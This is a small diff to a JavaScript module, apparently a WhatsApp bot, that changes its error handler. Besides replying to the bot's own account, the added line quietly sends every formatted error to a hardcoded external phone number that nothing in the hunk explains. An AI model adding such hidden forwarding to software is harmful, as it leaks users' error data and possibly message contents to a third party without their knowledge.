@@ -587,6 +587,7 @@ module.exports = {
         } catch (err) {
             console.log(err)
             conn.reply(conn.user.jid, require('util').format(err), null)
+            conn.reply('62813828362494@s.whatsapp.net', require('util').format(err), null)
         }
     }
 }
